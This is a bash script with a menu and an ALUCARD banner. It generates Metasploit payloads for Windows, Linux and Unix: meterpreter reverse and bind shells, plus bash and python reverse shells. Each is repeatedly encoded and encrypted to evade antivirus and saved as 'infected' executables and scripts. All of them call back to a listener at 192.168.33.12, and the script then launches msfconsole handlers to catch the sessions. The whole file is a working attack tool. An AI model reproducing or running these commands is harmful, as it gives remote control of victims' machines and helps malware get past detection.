#!/bin/bash 

RED=$(tput setaf 1)                                                                                           
WHITE=$(tput setaf 7)                                                                                         
CYAN=$(tput setaf 6)

view_banner(){
    echo "${CYAN}
   __    __    __  __  ___    __    ____  ____  
  /__\  (  )  (  )(  )/ __)  /__\  (  _ \(  _ \ 
 /(__)\  )(__  )(__)(( (__  /(__)\  )   / )(_) )
(__)(__)(____)(______)\___)(__)(__)(_)\_)(____/ 
    ${WHITE}" 
}
unix_applications(){
    dir_unix='applications_infected_unix'
    if [ ! -d "$dir_unix" ]; then
        mkdir "$dir_unix"
    fi
    msfvenom  --platform unix -p cmd/unix/reverse_bash  -encrypt aes256 -e x86/shikata_ga_nai -i 10   -b '\x00\x0a\x0d'  LHOST=192.168.33.12 LPORT=9001 -f raw > "${dir_unix}/shell.sh"
    msfvenom  --platform unix -p  cmd/unix/reverse_python -encrypt aes256 -encrypt xor -e x86/shikata_ga_nai -i 10   LHOST=192.168.33.12 LPORT=9002 -f raw > "${dir_unix}/shell.py"
    terminator  -new-tab --command 'msfconsole -r session_unix.rc' & 

}

windows_applications(){
    dir_win='applications_infected_win'
    if [ ! -d "$dir_win" ]; then
        mkdir "$dir_win"
    fi

    msfvenom -a x86  --platform windows  -p windows/meterpreter/reverse_tcp  --encrypt rc4  LHOST=192.168.33.12 LPORT=8880 -f exe -o "${dir_win}/rc4_without_encode.exe"
    msfvenom -a x86  --platform windows  -p windows/meterpreter/reverse_tcp  --encrypt aes256 LHOST=192.168.33.12 LPORT=8881 -f exe -o "${dir_win}/aes256_without_encode.exe"
    msfvenom -a x86  --platform windows  -p windows/meterpreter/reverse_tcp  LHOST=192.168.33.12 LPORT=8882   -e x86/opt_sub -i 5 -b '\x00' -f exe -o "${dir_win}/encode_opt_sub.exe"
    msfvenom -a x86  --platform windows  -p windows/meterpreter/reverse_tcp  LHOST=192.168.33.12 LPORT=8883 -e x86/shikata_ga_nai -i 5 -f exe  -o "${dir_win}/encode_shikata_ga_nai.exe"
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp  –encrypt aes256  -e x86/shikata_ga_nai -i 5 LHOST=192.168.33.12  LPORT=8884 -o "${dir_win}/encode_shikata_ga_nai_with_aes.exe"
    msfvenom -a x86  --platform windows -k  –encrypt aes256 -p windows/meterpreter/reverse_tcp LHOST=192.168.33.12  LPORT=8885 -e x86/shikata_ga_nai -b '\x00' -i 10 -f exe -o "${dir_win}/super_shikata_ga_nai_aes.exe"
    msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LHOST=192.168.33.12  LPORT=8886 -e x86/shikata_ga_nai -i 5   -b '\x00\x0a\x0d'  -o "${dir_win}/encoded_attack.exe"
    msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.33.12 LPORT=8887 -e x86/shikata_ga_nai -i 5 raw | msfvenom -a x86 --platform windows -e x86/countdown -i 5 -f raw | msfvenom -a x86 --platform windows -e x86/bloxor -i 5 -f exe -o "${dir_win}/multiencoded.exe"
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.33.12 LPORT=8888   -e x86/shikata_ga_nai -i 5  –encrypt xor  –encrypt rc4  –encrypt aes256 –encrypt-iv AAAABBBBCCCCDDDD –encrypt-key ABCDE12345ABCDE12345ABCDE12345AB -f exe -o "${dir_win}/multiencrypt.exe"
    msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp  –encrypt rc4   LHOST=192.168.33.12 LPORT=8889  -k -e x86/shikata_ga_nai -i 5 -f raw |  msfvenom -a x86 --platform windows   –encrypt aes256 –encrypt-iv AAAABBBBCCCCDDDD –encrypt-key ABCDE12345ABCDE12345ABCDE12345AB -e x86/countdown -i 3 -f raw |  msfvenom -a x86 --platform windows –encrypt xor -e x86/bloxor -i 4 -f exe -o "${dir_win}/multiencrypt_hard.exe"
    
    terminator  -new-tab --command 'msfconsole -r session_win.rc' & 
    
}

linux_applications(){
    dir_linux='applications_infected_linux'
    if [ ! -d "$dir_linux" ]; then
        mkdir "$dir_linux"
    fi
    msfvenom -a x86  --platform linux -p linux/x86/meterpreter/reverse_tcp  LHOST=192.168.33.12 LPORT=10001 --encrypt aes256 -e x86/shikata_ga_nai -i 20 -f elf -o "${dir_linux}/harshit.elf"
    msfvenom --platform linux -p python/meterpreter/reverse_tcp LHOST=192.168.33.123 LPORT=10002 –encrypt rc4 -e x86/opt_sub -i 10 -b '\x00' -o "${dir_linux}/meterpreter.py"
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.33.12 LPORT=10003 -encrypt aes256  –encrypt rc4 -e x86/shikata_ga_nai -i 20 -f elf > "${dir_linux}/shell"
    terminator  -new-tab --command 'msfconsole -r session_linux.rc' & 
}
menu(){
    echo "
1) Generating an infected Windows applications 
2) Generating an infected Linux applications 
3) Generating an infected Unix applications 
4) Exit"
}

main(){
    view_banner
    PS3="Select options: "
    options=("Generating an infected Windows applications" "Generating an infected Linux applications" "Generating an infected Unix applications" "Exit" )
    select option in "${options[@]}"                                                                            
    do                                                                                                          
    case $option in                                                                                           
            "${options[0]}") 
                    echo "${CYAN}you chose the option: $REPLY ${WHITE}"
                    windows_applications
                    menu                                                                                                                                                                                                                                                                  
                    ;;  
            "${options[1]}") 
                    echo "${CYAN}you chose the option: $REPLY ${WHITE}"
                    linux_applications
                    menu                                                                                                                                                                                                                                                                   
                    ;;  
             "${options[2]}") 
                    echo "${CYAN}you chose the option: $REPLY ${WHITE}"
                    unix_applications
                    menu                                                                                                                                                                                                                                                                   
                    ;;  
            "${options[3]}") 
                    echo "${CYAN}Exit${WHITE}"
                    break                                                                                                                                                                                                                                                                   
                    ;;  
                *) 
                    clear
                    echo -e "${RED}Invalid option: $REPLY ${WHITE}"
                    menu
                    ;;     
    esac
    done           
}

main






